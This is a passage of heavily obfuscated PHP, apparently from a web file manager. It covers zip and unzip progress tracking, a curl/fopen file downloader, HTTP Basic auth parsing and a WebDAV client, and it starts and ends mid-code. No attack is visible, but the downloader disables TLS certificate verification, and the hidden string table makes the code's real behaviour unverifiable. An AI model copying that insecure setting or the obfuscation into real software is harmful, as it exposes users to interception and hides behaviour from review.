LNG($aßƒäòˆ¾°[1420]); } goto f…÷¤¡ÔÅÃ; BŸõ‰øĞç‘: $aßƒäòˆ¾° =& $_SERVER[ì‹É]; parent::startAfter(); Hook::bind($aßƒäòˆ¾°[1416], array($this, $aßƒäòˆ¾°[1417])); goto Eø„ÔÏ¨ÙŞ; Eø„ÔÏ¨ÙŞ: Hook::bind($aßƒäòˆ¾°[1009], array($this, $aßƒäòˆ¾°[1418])); $DÓœÂ¥ìÍ =& $this->task; $DÓœÂ¥ìÍ[$aßƒäòˆ¾°[1419]] = $aßƒäòˆ¾°[1014]; goto cø¥ÔŸˆ˜²; f…÷¤¡ÔÅÃ: } protected function endAfter() { $f‚æ›Éô˜Õ =& $_SERVER[ì‹É]; parent::endAfter(); Hook::unbind($f‚æ›Éô˜Õ[1416], array($this, $f‚æ›Éô˜Õ[1417])); Hook::unbind($f‚æ›Éô˜Õ[1009], array($this, $f‚æ›Éô˜Õ[1418])); } public function updateAfter() { $F¥†ïÖÒÖù =& $_SERVER[ì‹É]; $EÌ“À«¢Ú =& $this->task; if (!$EÌ“À«¢Ú[$F¥†ïÖÒÖù[1294]] || !$EÌ“À«¢Ú[$F¥†ïÖÒÖù[685]]) { return; } if ($EÌ“À«¢Ú[$F¥†ïÖÒÖù[1419]] == $F¥†ïÖÒÖù[1014]) { $DÀĞ·À˜í¾ = 0; if ($EÌ“À«¢Ú[$F¥†ïÖÒÖù[1396]]) { $DÀĞ·À˜í¾ = $EÌ“À«¢Ú[$F¥†ïÖÒÖù[1397]] / $EÌ“À«¢Ú[$F¥†ïÖÒÖù[1396]]; } $EÌ“À«¢Ú[$F¥†ïÖÒÖù[1352]] = $DÀĞ·À˜í¾ * 0.3; } else { if ($EÌ“À«¢Ú[$F¥†ïÖÒÖù[1419]] == $F¥†ïÖÒÖù[298]) { $DÀĞ·À˜í¾ = $EÌ“À«¢Ú[$F¥†ïÖÒÖù[1299]] / $EÌ“À«¢Ú[$F¥†ïÖÒÖù[1294]]; $EÌ“À«¢Ú[$F¥†ïÖÒÖù[1352]] = 0.3 + $DÀĞ·À˜í¾ * 0.4; } else { if ($EÌ“À«¢Ú[$F¥†ïÖÒÖù[1419]] == $F¥†ïÖÒÖù[92]) { $D¼«†ÎĞãÃ = 0; if ($EÌ“À«¢Ú[$F¥†ïÖÒÖù[1398]] == $F¥†ïÖÒÖù[92]) { $D¼«†ÎĞãÃ = $EÌ“À«¢Ú[$F¥†ïÖÒÖù[1397]]; } $DÀĞ·À˜í¾ = ($EÌ“À«¢Ú[$F¥†ïÖÒÖù[1401]] + $D¼«†ÎĞãÃ) / $EÌ“À«¢Ú[$F¥†ïÖÒÖù[685]]; $EÌ“À«¢Ú[$F¥†ïÖÒÖù[1352]] = 0.3 + 0.4 + $DÀĞ·À˜í¾ * 0.3; } } } if ($EÌ“À«¢Ú[$F¥†ïÖÒÖù[1352]] > 0) { $E‚©Æé¶Šò = timeFloat() - $EÌ“À«¢Ú[$F¥†ïÖÒÖù[1354]] - $EÌ“À«¢Ú[$F¥†ïÖÒÖù[1357]]; $EÌ“À«¢Ú[$F¥†ïÖÒÖù[1358]] = $E‚©Æé¶Šò * (1 - $EÌ“À«¢Ú[$F¥†ïÖÒÖù[1352]]) / $EÌ“À«¢Ú[$F¥†ïÖÒÖù[1352]]; } } public function addFile($eëè®†½âÜ) { goto Bé½‘²ÉÜí; Bé½‘²ÉÜí: $f¨ÕöäˆÔŞ =& $_SERVER[ì‹É]; $fä¨Ñ†Î¸ =& $this->task; $DãÁ®¬Í‡ß = IO::info($eëè®†½âÜ); goto eĞŠ˜‡ÔÛŸ; eĞŠ˜‡ÔÛŸ: $fä¨Ñ†Î¸[$f¨ÕöäˆÔŞ[1394]] = $DãÁ®¬Í‡ß[$f¨ÕöäˆÔŞ[28]]; $fä¨Ñ†Î¸[$f¨ÕöäˆÔŞ[1396]] = $DãÁ®¬Í‡ß[$f¨ÕöäˆÔŞ[78]]; $fä¨Ñ†Î¸[$f¨ÕöäˆÔŞ[1397]] = 0; goto C‚Ä•ä²‘; C‚Ä•ä²‘: $fä¨Ñ†Î¸[$f¨ÕöäˆÔŞ[1296]] = $f¨ÕöäˆÔŞ[1409]; $fä¨Ñ†Î¸[$f¨ÕöäˆÔŞ[1398]] = $f¨ÕöäˆÔŞ[1014]; $fä¨Ñ†Î¸[$f¨ÕöäˆÔŞ[685]] = $DãÁ®¬Í‡ß[$f¨ÕöäˆÔŞ[78]]; goto f¢ñÁßğÛ¦; bªÊçå«÷À: $this->update(); goto e·‡¼äì™; f¢ñÁßğÛ¦: $fä¨Ñ†Î¸[$f¨ÕöäˆÔŞ[1294]] = 1; $eÈæ«×ÍèÁ = 0; $fä¨Ñ†Î¸[$f¨ÕöäˆÔŞ[1402]] = array($f¨ÕöäˆÔŞ[1403] => $eÈæ«×ÍèÁ + 1, $f¨ÕöäˆÔŞ[383] => $DãÁ®¬Í‡ß[$f¨ÕöäˆÔŞ[28]], $f¨ÕöäˆÔŞ[76] => $DãÁ®¬Í‡ß[$f¨ÕöäˆÔŞ[76]], $f¨ÕöäˆÔŞ[462] => $DãÁ®¬Í‡ß[$f¨ÕöäˆÔŞ[462]] ? $DãÁ®¬Í‡ß[$f¨ÕöäˆÔŞ[462]] : $DãÁ®¬Í‡ß[$f¨ÕöäˆÔŞ[76]]); goto bªÊçå«÷À; e·‡¼äì™: } public function unzipAfter($a«°ñ˜“) { goto D×Ô¬À×à×; F‘à¹ïÊŞ•: $DŒË’ªªó[$ašŞŠĞ˜„Ø[1394]] = $ašŞŠĞ˜„Ø[33]; $DŒË’ªªó[$ašŞŠĞ˜„Ø[1401]] = 0; $DŒË’ªªó[$ašŞŠĞ˜„Ø[685]] = $F¦™æ³¬Œ‚[$ašŞŠĞ˜„Ø[78]]; goto b—ô§ŞøİØ; D×Ô¬À×à×: $ašŞŠĞ˜„Ø =& $_SERVER[ì‹É]; $DŒË’ªªó =& $this->task; $DŒË’ªªó[$ašŞŠĞ˜„Ø[1419]] = $ašŞŠĞ˜„Ø[92]; goto bå«„•Šò; b—ô§ŞøİØ: $this->update(); self::log($ašŞŠĞ˜„Ø[1421] . json_encode(array($DŒË’ªªó, $F¦™æ³¬Œ‚))); goto f¸÷¢îõœ’; bå«„•Šò: $F¦™æ³¬Œ‚ = IO::infoWithChildren($a«°ñ˜“); $C’õŠÉÚêƒ = 0; $DŒË’ªªó[$ašŞŠĞ˜„Ø[1402]] = array($ašŞŠĞ˜„Ø[1403] => $C’õŠÉÚêƒ + 1, $ašŞŠĞ˜„Ø[383] => $F¦™æ³¬Œ‚[$ašŞŠĞ˜„Ø[28]], $ašŞŠĞ˜„Ø[76] => $F¦™æ³¬Œ‚[$ašŞŠĞ˜„Ø[76]], $ašŞŠĞ˜„Ø[462] => $F¦™æ³¬Œ‚[$ašŞŠĞ˜„Ø[462]] ? $F¦™æ³¬Œ‚[$ašŞŠĞ˜„Ø[462]] : $F¦™æ³¬Œ‚[$ašŞŠĞ˜„Ø[76]]); goto câÛ©¢Û›…; AõÇğâ‘ÉÜ: $DŒË’ªªó[$ašŞŠĞ˜„Ø[1299]] = 0; $DŒË’ªªó[$ašŞŠĞ˜„Ø[1396]] = 0; $DŒË’ªªó[$ašŞŠĞ˜„Ø[1397]] = 0; goto F‘à¹ïÊŞ•; câÛ©¢Û›…: if ($F¦™æ³¬Œ‚[$ašŞŠĞ˜„Ø[29]] == $ašŞŠĞ˜„Ø[164]) { $DŒË’ªªó[$ašŞŠĞ˜„Ø[1294]] = 1; } else { $DŒË’ªªó[$ašŞŠĞ˜„Ø[1294]] = $F¦™æ³¬Œ‚[$ašŞŠĞ˜„Ø[81]][$ašŞŠĞ˜„Ø[79]]; } $DŒË’ªªó[$ašŞŠĞ˜„Ø[1296]] = $ašŞŠĞ˜„Ø[33]; $DŒË’ªªó[$ašŞŠĞ˜„Ø[1398]] = 0; goto AõÇğâ‘ÉÜ; f¸÷¢îõœ’: } public function nameParse($aÑ¬×æ½‹) { goto E’¼õÀ‘; a—ñô­›¼: $EÔ…íù§³ë = get_path_this($aÑ¬×æ½‹); if (strstr($EÔ…íù§³ë, $CÅîì¡Ú§Ù[94])) { $dŒÕ­±Í‘[$CÅîì¡Ú§Ù[1299]] += 1; $dŒÕ­±Í‘[$CÅîì¡Ú§Ù[1294]] += 1; } $dŒÕ­±Í‘[$CÅîì¡Ú§Ù[1394]] = $aÑ¬×æ½‹; goto CÁâ¡§ †›; E’¼õÀ‘: $CÅîì¡Ú§Ù =& $_SERVER[ì‹É]; $dŒÕ­±Í‘ =& $this->task; if ($dŒÕ­±Í‘[$CÅîì¡Ú§Ù[1419]] == $CÅîì¡Ú§Ù[1014]) { $dŒÕ­±Í‘[$CÅîì¡Ú§Ù[1419]] = $CÅîì¡Ú§Ù[298]; $dŒÕ­±Í‘[$CÅîì¡Ú§Ù[1401]] = 0; $dŒÕ­±Í‘[$CÅîì¡Ú§Ù[685]] = 0; } goto a—ñô­›¼; CÁâ¡§ †›: $this->update(); goto dº„Ê¬ªä°; dº„Ê¬ªä°: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $cö‰ëŞäÅ´ =& $_SERVER[ì‹É]; parent::startAfter(); Hook::bind($cö‰ëŞäÅ´[1422], array($this, $cö‰ëŞäÅ´[1417])); $eêê®ã‰Û =& $this->task; $eêê®ã‰Û[$cö‰ëŞäÅ´[1419]] = $cö‰ëŞäÅ´[1014]; if (!$eêê®ã‰Û[$cö‰ëŞäÅ´[1248]]) { $eêê®ã‰Û[$cö‰ëŞäÅ´[1248]] = LNG($cö‰ëŞäÅ´[1423]); } } protected function endAfter() { $AŞ´ŸŸíÌÀ =& $_SERVER[ì‹É]; parent::endAfter(); Hook::unbind($AŞ´ŸŸíÌÀ[1422], array($this, $AŞ´ŸŸíÌÀ[1417])); } public function updateAfter() { $bÚâ‹šâŞ =& $_SERVER[ì‹É]; $FŠŸÎ÷ó =& $this->task; if (!$FŠŸÎ÷ó[$bÚâ‹šâŞ[1294]] || !$FŠŸÎ÷ó[$bÚâ‹šâŞ[685]]) { return; } if ($FŠŸÎ÷ó[$bÚâ‹šâŞ[1419]] == $bÚâ‹šâŞ[1014]) { $B«‡Á¶¤ = $FŠŸÎ÷ó[$bÚâ‹šâŞ[1397]]; if ($FŠŸÎ÷ó[$bÚâ‹šâŞ[1398]] != $bÚâ‹šâŞ[1014]) { $B«‡Á¶¤ = 0; } $F‘÷ºÈ…¯ = ($FŠŸÎ÷ó[$bÚâ‹šâŞ[1401]] + $B«‡Á¶¤) / $FŠŸÎ÷ó[$bÚâ‹šâŞ[685]]; $FŠŸÎ÷ó[$bÚâ‹šâŞ[1352]] = $F‘÷ºÈ…¯ * 0.3; } else { if ($FŠŸÎ÷ó[$bÚâ‹šâŞ[1419]] == $bÚâ‹šâŞ[298]) { $F‘÷ºÈ…¯ = $FŠŸÎ÷ó[$bÚâ‹šâŞ[1299]] / $FŠŸÎ÷ó[$bÚâ‹šâŞ[1294]]; $FŠŸÎ÷ó[$bÚâ‹šâŞ[1352]] = 0.3 + $F‘÷ºÈ…¯ * 0.5; } else { if ($FŠŸÎ÷ó[$bÚâ‹šâŞ[1419]] == $bÚâ‹šâŞ[92]) { $F‘÷ºÈ…¯ = 0; if ($FŠŸÎ÷ó[$bÚâ‹šâŞ[1396]]) { $F‘÷ºÈ…¯ = $FŠŸÎ÷ó[$bÚâ‹šâŞ[1397]] / $FŠŸÎ÷ó[$bÚâ‹šâŞ[1396]]; } $FŠŸÎ÷ó[$bÚâ‹šâŞ[1352]] = 0.3 + 0.5 + $F‘÷ºÈ…¯ * 0.2; } } } if ($FŠŸÎ÷ó[$bÚâ‹šâŞ[1352]] > 0) { $bÑ§¢Á ™ = timeFloat() - $FŠŸÎ÷ó[$bÚâ‹šâŞ[1354]] - $FŠŸÎ÷ó[$bÚâ‹šâŞ[1357]]; $FŠŸÎ÷ó[$bÚâ‹šâŞ[1358]] = $bÑ§¢Á ™ * (1 - $FŠŸÎ÷ó[$bÚâ‹šâŞ[1352]]) / $FŠŸÎ÷ó[$bÚâ‹šâŞ[1352]]; } } public function copyFileStart($Cğ™ŠïáÀ, $E¾ÉÃŠÍ·Ğ, $báºíÙåŸ¬, $eÖÆ³ƒã¬©, $bì‚³È—ãá, $BâÄ¡¼Œ¡°) { $fÑÎÙïÏÓµ =& $_SERVER[ì‹É]; parent::copyFileStart($Cğ™ŠïáÀ, $E¾ÉÃŠÍ·Ğ, $báºíÙåŸ¬, $eÖÆ³ƒã¬©, $bì‚³È—ãá, $BâÄ¡¼Œ¡°); $aËŒ‰Æ¼ŠÖ =& $this->task; if ($aËŒ‰Æ¼ŠÖ[$fÑÎÙïÏÓµ[1419]] == $fÑÎÙïÏÓµ[298]) { $aËŒ‰Æ¼ŠÖ[$fÑÎÙïÏÓµ[1419]] = $fÑÎÙïÏÓµ[92]; } $this->update(); } public function copyFileEnd($dŒ‚«ˆ°ÒÌ, $AŠ¡Š·Ìˆ¤, $e˜êª÷ƒ—, $eÙƒå²íğ, $B¶¾Úèçµ, $bøîª‰ÛÖ¦) { $Eñ¥å»·µŞ =& $_SERVER[ì‹É]; $D†‹•ºÖ =& $this->task; $D†‹•ºÖ[$Eñ¥å»·µŞ[1397]] = $D†‹•ºÖ[$Eñ¥å»·µŞ[1396]]; $D†‹•ºÖ[$Eñ¥å»·µŞ[1401]] += $D†‹•ºÖ[$Eñ¥å»·µŞ[1396]]; $D†‹•ºÖ[$Eñ¥å»·µŞ[1398]] = $Eñ¥å»·µŞ[33]; $this->update(); } public function nameParse($aØñÒáŠ†) { $A•àîæƒÑ¡ =& $_SERVER[ì‹É]; $BÃùµöê =& $this->task; if ($BÃùµöê[$A•àîæƒÑ¡[1299]] < $BÃùµöê[$A•àîæƒÑ¡[1294]]) { $C¢Ÿ¤©…ÔÊ = get_path_this($aØñÒáŠ†); if (strstr($C¢Ÿ¤©…ÔÊ, $A•àîæƒÑ¡[94])) { $BÃùµöê[$A•àîæƒÑ¡[1299]] += 1; } } if ($BÃùµöê[$A•àîæƒÑ¡[1419]] == $A•àîæƒÑ¡[1014]) { $BÃùµöê[$A•àîæƒÑ¡[1419]] = $A•àîæƒÑ¡[298]; } $BÃùµöê[$A•àîæƒÑ¡[1394]] = $aØñÒáŠ†; $this->update(); } } class Downloader { static function start($cŞœçï•ªì, $B£‡òÜÕ£Ï, $f“•…â®›ß = 10) { goto cñÉ·Ç¢×º; FÅÂÌÍŞ‡: $dİ‚—¯Ãºô = $B£‡òÜÕ£Ï . $D½‚ŒÜæ™[1425]; if (is_array($cŞœçï•ªì)) { $BÓíŠÇÊ’ = $cŞœçï•ªì; } else { $BÓíŠÇÊ’ = url_header($cŞœçï•ªì); } $cŞœçï•ªì = $BÓíŠÇÊ’[$D½‚ŒÜæ™[292]]; goto dùƒŒÆãµ£; cÍ©ë ºçº: if ($aÉêÙ‚õÙÃ[$D½‚ŒÜæ™[1006]]) { @unlink($dƒ­†Â²ŠÅ); } return $aÉêÙ‚õÙÃ; goto díÓ´Ñ¼Â; d¯˜ö§æ–í: $D¡ˆŒ¿¸² = intval($BÓíŠÇÊ’[$D½‚ŒÜæ™[322]]); if (file_exists($dİ‚—¯Ãºô) && time() - filemtime($dİ‚—¯Ãºô) < 3) { return array($D½‚ŒÜæ™[1006] => !1, $D½‚ŒÜæ™[1008] => $D½‚ŒÜæ™[1426]); } $BÄèØåĞÕ = array(); goto B»´ñ’ëƒ‰; B¢ºÂ¹ß¨„: if ($d¨«ßª£ôë > $D¡ˆŒ¿¸²) { @unlink($dİ‚—¯Ãºô); } file_put_contents($dƒ­†Â²ŠÅ, json_encode($BÄèØåĞÕ)); $aÉêÙ‚õÙÃ = self::fileDownloadCurl($cŞœçï•ªì, $B£‡òÜÕ£Ï, !0, $d¨«ßª£ôë, $D¡ˆŒ¿¸²); goto cÍ©ë ºçº; dùƒŒÆãµ£: if (!$cŞœçï•ªì) { return array($D½‚ŒÜæ™[1006] => !1, $D½‚ŒÜæ™[1008] => $D½‚ŒÜæ™[1011]); } if (!$BÓíŠÇÊ’[$D½‚ŒÜæ™[1206]] || $BÓíŠÇÊ’[$D½‚ŒÜæ™[322]] == 0) { @unlink($dİ‚—¯Ãºô); @unlink($B£‡òÜÕ£Ï); $aÉêÙ‚õÙÃ = self::fileDownloadFopen($cŞœçï•ªì, $B£‡òÜÕ£Ï, $BÓíŠÇÊ’[$D½‚ŒÜæ™[322]]); if ($aÉêÙ‚õÙÃ[$D½‚ŒÜæ™[1006]]) { return $aÉêÙ‚õÙÃ; } else { @unlink($dİ‚—¯Ãºô); @unlink($B£‡òÜÕ£Ï); $aÉêÙ‚õÙÃ = self::fileDownloadCurl($cŞœçï•ªì, $B£‡òÜÕ£Ï, !1, 0, $BÓíŠÇÊ’[$D½‚ŒÜæ™[322]]); @unlink($dİ‚—¯Ãºô); return $aÉêÙ‚õÙÃ; } } $d¨«ßª£ôë = is_file($dİ‚—¯Ãºô) ? filesize($dİ‚—¯Ãºô) : 0; goto d¯˜ö§æ–í; B»´ñ’ëƒ‰: if (is_file($dƒ­†Â²ŠÅ)) { $F¥ÒªŠğ¶¾ = file_get_contents($dƒ­†Â²ŠÅ); $BÄèØåĞÕ = json_decode($F¥ÒªŠğ¶¾, 1); } if (file_exists($B£‡òÜÕ£Ï) && $D¡ˆŒ¿¸² == filesize($B£‡òÜÕ£Ï)) { @unlink($dİ‚—¯Ãºô); @unlink($dƒ­†Â²ŠÅ); return array($D½‚ŒÜæ™[1006] => !0, $D½‚ŒÜæ™[1008] => $D½‚ŒÜæ™[1427]); } if ($BÄèØåĞÕ[$D½‚ŒÜæ™[322]] != $D¡ˆŒ¿¸²) { $BÄèØåĞÕ = array($D½‚ŒÜæ™[322] => $D¡ˆŒ¿¸²); } goto B¢ºÂ¹ß¨„; cñÉ·Ç¢×º: $D½‚ŒÜæ™ =& $_SERVER[ì‹É]; if (!request_url_safe($cŞœçï•ªì)) { return array($D½‚ŒÜæ™[1006] => !1, $D½‚ŒÜæ™[1008] => $D½‚ŒÜæ™[1011]); } $dƒ­†Â²ŠÅ = $B£‡òÜÕ£Ï . $D½‚ŒÜæ™[1424]; goto FÅÂÌÍŞ‡; díÓ´Ñ¼Â: } static function fileDownloadFopen($bÎá«ÌÛ©Ş, $f®°Ï…ÈëŒ, $F¥âµõŒ©¤ = 0) { $eöÆœ¶·ö =& $_SERVER[ì‹É]; @ini_set($eöÆœ¶·ö[1428], $eöÆœ¶·ö[1429]); $cğ¸³’ë„¡ = $f®°Ï…ÈëŒ . $eöÆœ¶·ö[1425]; set_timeout(); @unlink($cğ¸³’ë„¡); if ($B¼èÉ»ÒÍ = @fopen($bÎá«ÌÛ©Ş, $eöÆœ¶·ö[1430])) { goto e„Òóèé£Ì; C‘’óÒï·: self::checkGzip($cğ¸³’ë„¡); if (!@rename($cğ¸³’ë„¡, $f®°Ï…ÈëŒ)) { usleep(round(rand(0, 1000) * 50)); @unlink($f®°Ï…ÈëŒ); $fœÔ¦í¡ªà = @rename($cğ¸³’ë„¡, $f®°Ï…ÈëŒ); if (!$fœÔ¦í¡ªà) { return array($eöÆœ¶·ö[1006] => !1, $eöÆœ¶·ö[1008] => $eöÆœ¶·ö[1435]); } } return array($eöÆœ¶·ö[1006] => !0, $eöÆœ¶·ö[1008] => $eöÆœ¶·ö[683]); goto c„×„†ÄâÔ; e„Òóèé£Ì: if (!($F‹¬çÆ®ÖÀ = @fopen($cğ¸³’ë„¡, $eöÆœ¶·ö[1431]))) { return array($eöÆœ¶·ö[1006] => !1, $eöÆœ¶·ö[1008] => $eöÆœ¶·ö[1432]); } while (!feof($B¼èÉ»ÒÍ)) { if (!file_exists($cğ¸³’ë„¡)) { fclose($F‹¬çÆ®ÖÀ); return array($eöÆœ¶·ö[1006] => !1, $eöÆœ¶·ö[1008] => $eöÆœ¶·ö[1433]); } clearstatcache(); if ($F¥âµõŒ©¤ > 0 && $F¥âµõŒ©¤ == filesize(iconv_system($cğ¸³’ë„¡))) { break; } fwrite($F‹¬çÆ®ÖÀ, fread($B¼èÉ»ÒÍ, 1024 * 8), 1024 * 8); } fclose($F‹¬çÆ®ÖÀ); goto D‚¿‹œÉä; D‚¿‹œÉä: fclose($B¼èÉ»ÒÍ); $fåŠèÒï°é = filesize(iconv_system($cğ¸³’ë„¡)); if ($F¥âµõŒ©¤ != 0 && $fåŠèÒï°é != $F¥âµõŒ©¤) { return array($eöÆœ¶·ö[1006] => !1, $eöÆœ¶·ö[1008] => $eöÆœ¶·ö[1434]); } goto C‘’óÒï·; c„×„†ÄâÔ: } else { return array($eöÆœ¶·ö[1006] => !1, $eöÆœ¶·ö[1008] => $eöÆœ¶·ö[1436]); } } static function fileDownloadCurl($e¸Üîù²­ğ, $Eííãöç§, $aƒœ¶Ä½ = false, $EŠ‚àóñ­é = 0, $Dç·ô™­èó = 0) { goto E¦™–ŠÇÊ; Aİ¡·­õÆù: curl_setopt($B’É®Æ“¯‰, CURLOPT_NOPROGRESS, !1); curl_setopt($B’É®Æ“¯‰, CURLOPT_PROGRESSFUNCTION, $E¸äé­‰â[1194]); curl_progress_start($B’É®Æ“¯‰); goto d³åÂêãòÂ; d³åÂêãòÂ: curl_setopt($B’É®Æ“¯‰, CURLOPT_USERAGENT, $E¸äé­‰â[1429]); $b‹ÇˆÍ·İö = curl_exec($B’É®Æ“¯‰); curl_progress_end($B’É®Æ“¯‰); goto aäî’ª•æ¾; D‹ùĞŸÒ¿¹: $e³öŒ £¨ = @fopen($AÇ³¤×òŠÀ, $E¸äé­‰â[707]); if (!$e³öŒ £¨) { return array($E¸äé­‰â[1006] => !1, $E¸äé­‰â[1008] => $E¸äé­‰â[1437]); } $B’É®Æ“¯‰ = curl_init($e¸Üîù²­ğ); goto bÆ¯ê’¡êÉ; E¦™–ŠÇÊ: $E¸äé­‰â =& $_SERVER[ì‹É]; $AÇ³¤×òŠÀ = $Eííãöç§ . $E¸äé­‰â[1425]; set_timeout(); goto D‹ùĞŸÒ¿¹; CáÅˆÌ”ã‡: curl_setopt($B’É®Æ“¯‰, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($B’É®Æ“¯‰, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($B’É®Æ“¯‰, CURLOPT_SSL_VERIFYHOST, 0); goto Aİ¡·­õÆù; a‰Éèµ–: return array($E¸äé­‰â[1006] => !1, $E¸äé­‰â[1008] => $E¸äé­‰â[1439]); goto BÁÅ·¤ì‘‡; bÆ¯ê’¡êÉ: if ($aƒœ¶Ä½) { curl_setopt($B’É®Æ“¯‰, CURLOPT_RANGE, $EŠ‚àóñ­é . $E¸äé­‰â[700]); } curl_setopt($B’É®Æ“¯‰, CURLOPT_FILE, $e³öŒ £¨); curl_setopt($B’É®Æ“¯‰, CURLOPT_REFERER, get_url_link($e¸Üîù²­ğ)); goto CáÅˆÌ”ã‡; båˆÖ°õ†¿: if ($e¶˜ß…ÀÄÛ < $Dç·ô™­èó && $Dç·ô™­èó != 0) { return array($E¸äé­‰â[1006] => !1, $E¸äé­‰â[1008] => $E¸äé­‰â[1426]); } if ($e¶˜ß…ÀÄÛ > $Dç·ô™­èó && $Dç·ô™­èó != 0) { return array($E¸äé­‰â[1006] => !1, $E¸äé­‰â[1008] => $E¸äé­‰â[1434]); } if ($b‹ÇˆÍ·İö && filesize($AÇ³¤×òŠÀ) != 0) { self::checkGzip($AÇ³¤×òŠÀ); if (!@rename($AÇ³¤×òŠÀ, $Eííãöç§)) { @unlink($Eííãöç§); $b‹ÇˆÍ·İö = @rename($AÇ³¤×òŠÀ, $Eííãöç§); if (!$b‹ÇˆÍ·İö) { return array($E¸äé­‰â[1006] => !1, $E¸äé­‰â[1008] => $E¸äé­‰â[1438]); } } return array($E¸äé­‰â[1006] => !0, $E¸äé­‰â[1008] => $E¸äé­‰â[683]); } goto a‰Éèµ–; aäî’ª•æ¾: curl_close($B’É®Æ“¯‰); fclose($e³öŒ £¨); $e¶˜ß…ÀÄÛ = filesize(iconv_system($AÇ³¤×òŠÀ)); goto båˆÖ°õ†¿; BÁÅ·¤ì‘‡: } static function checkGzip($DÃÀ§å’Ş´) { goto fÈµÌƒØ; e®£ÛãÅ¦î: ob_start(); readgzfile($DÃÀ§å’Ş´); $A÷¾‰ŸŞ†Ş = ob_get_clean(); goto d­¿ÇÕ»ã±; fÈµÌƒØ: $D·­½£î¦Å = $_SERVER[ì‹É][1440]; $DÕÂà¥²…‘ = file_sub_str($DÃÀ§å’Ş´, 0, 2); if ($D·­½£î¦Å != $DÕÂà¥²…‘) { return; } goto e®£ÛãÅ¦î; d­¿ÇÕ»ã±: file_put_contents($DÃÀ§å’Ş´, $A÷¾‰ŸŞ†Ş); goto fÔ¼¼Èğç; fÔ¼¼Èğç: } } goto eµß†¾øÓÔ; CôàÑ„ã½: class HttpAuth { public static function get() { $CéÃ™” =& $_SERVER[ì‹É]; $bÛµáßëğ– = $CéÃ™”[33]; $EõÄÔ§˜ÀÅ = $CéÃ™”[33]; if (isset($_SERVER[$CéÃ™”[1668]])) { $bÛµáßëğ– = $_SERVER[$CéÃ™”[1668]]; $EõÄÔ§˜ÀÅ = $_SERVER[$CéÃ™”[1669]]; } elseif (isset($_SERVER[$CéÃ™”[1670]])) { $c„ÊÏ—Ç¿² = $_SERVER[$CéÃ™”[1670]]; if (strpos(strtolower($c„ÊÏ—Ç¿²), $CéÃ™”[1671]) === 0) { $a«äœ‚ôÈÅ = explode($CéÃ™”[4], base64_decode(substr($c„ÊÏ—Ç¿², 6))); $bÛµáßëğ– = isset($a«äœ‚ôÈÅ[0]) ? $a«äœ‚ôÈÅ[0] : $CéÃ™”[33]; $EõÄÔ§˜ÀÅ = isset($a«äœ‚ôÈÅ[1]) ? $a«äœ‚ôÈÅ[1] : 0; } } return array($CéÃ™”[527] => $bÛµáßëğ–, $CéÃ™”[894] => $EõÄÔ§˜ÀÅ); } public static function error() { goto e°èÑ¤…èé; Dà·ªä¬Ò: die; goto açÍ¯é·¾Ò; e°èÑ¤…èé: $E»ƒ‡¥ƒã© =& $_SERVER[ì‹É]; header($E»ƒ‡¥ƒã©[1672]); header($E»ƒ‡¥ƒã©[1673]); goto bÆ¥«á‹¬; bÆ¥«á‹¬: header($E»ƒ‡¥ƒã©[1674]); header($E»ƒ‡¥ƒã©[1675]); header($E»ƒ‡¥ƒã©[1676]); goto Dà·ªä¬Ò; açÍ¯é·¾Ò: } public static function make($A¹£¿ê‡Ş, $dºÀ„½àï„) { $FÇ¨„÷‘– =& $_SERVER[ì‹É]; return $FÇ¨„÷‘–[1677] + base64_encode($A¹£¿ê‡Ş . $FÇ¨„÷‘–[4] . $dºÀ„½àï„); } } class HttpDavClient { public function __construct($FÔ‰İ…¸ô, $Cî›—†÷, $c²„‰Åµã) { $this->header = array(); $this->userName = $Cî›—†÷; $this->userPassowrd = $c²„‰Åµã; } protected function makePath($DŠ”¤ó…ê) { return $DŠ”¤ó…ê; } protected function setHeader($eô¿Ë·ÁğŒ, $f´‰¿‘ÅĞ = false) { if ($f´‰¿‘ÅĞ === !1) { $this->header[] = $eô¿Ë·ÁğŒ; } else { $this->header[] = $eô¿Ë·ÁğŒ . $_SERVER[ì‹É][877] . $f´‰¿‘ÅĞ; } } public function move($E’ÂÕÀùÂ®, $d´„É†Ö„†, $FŠ îŒ­À = '') { $AŸ·åŞ³ì =& $_SERVER[ì‹É]; $this->setHeader($AŸ·åŞ³ì[1678], $this->makePath($d´„É†Ö„†)); $this->setHeader($AŸ·åŞ³ì[1679], $AŸ·åŞ³ì[1680]); if ($FŠ îŒ­À) { $this->setHeader($AŸ·åŞ³ì[1681], $AŸ·åŞ³ì[922] . $FŠ îŒ­À . $AŸ·åŞ³ì[925]); } return $this->send($AŸ·åŞ³ì[1682], $E’ÂÕÀùÂ®); } public function copy($d‡Å•ß‚­•, $Dàáˆºñù) { $f£æÓÙõ =& $_SERVER[ì‹É]; $this->setHeader($f£æÓÙõ[1678], $this->makePath($Dàáˆºñù)); $this->setHeader($f£æÓÙõ[1679], $f£æÓÙõ[1680]); return $this->send($f£æÓÙõ[1683], $d‡Å•ß‚­•); } public function mkcol($eóÚ³Áù) { $FÅ«Ú§Ú½È =& $_SERVER[ì‹É]; $this->setHeader($FÅ«Ú§Ú½È[1679], $FÅ«Ú§Ú½È[1680]); return $this->send($FÅ«Ú§Ú½È[1684], $eóÚ³Áù); } public function delete($cÊàÉÀ‡«¯, $b‘­œğÄÅÈ = '') { $CÄ«­™£Ìµ =& $_SERVER[ì‹É]; if ($b‘­œğÄÅÈ) { $this->setHeader($CÄ«­™£Ìµ[1681], $CÄ«­™£Ìµ[922] . $b‘­œğÄÅÈ . $CÄ«­™£Ìµ[925]); } return $this->send($CÄ«­™£Ìµ[1685], $cÊàÉÀ‡«¯); } public function propfind($DÃéˆËÆò´) { $CÌô°¹ˆÁ¶ =& $_SERVER[ì‹É]; $this->setHeader($CÌô°¹ˆÁ¶[1686], $CÌô°¹ˆÁ¶[84]); $this->setHeader($CÌô°¹ˆÁ¶[1687], $CÌô°¹ˆÁ¶[1688]); $A½ËÒŠÔ¹µ = $CÌô°¹ˆÁ¶[1689]; return $this->send($CÌô°¹ˆÁ¶[1690], $DÃéˆËÆò´, $A½ËÒŠÔ¹µ); } public function options($CÑì¬ÀÁ¯Ì) { return $this->send($_SERVER[ì‹É][1691], $CÑì¬ÀÁ¯Ì); } public function get($aÕÍÕ²‡ˆØ) { return $this->send($_SERVER[ì‹É][213], $aÕÍÕ²‡ˆØ); } public function put($eƒíÔø è„, $d©Ÿßì®Ş©, $c¼ªÑÅšÛ† = '') { 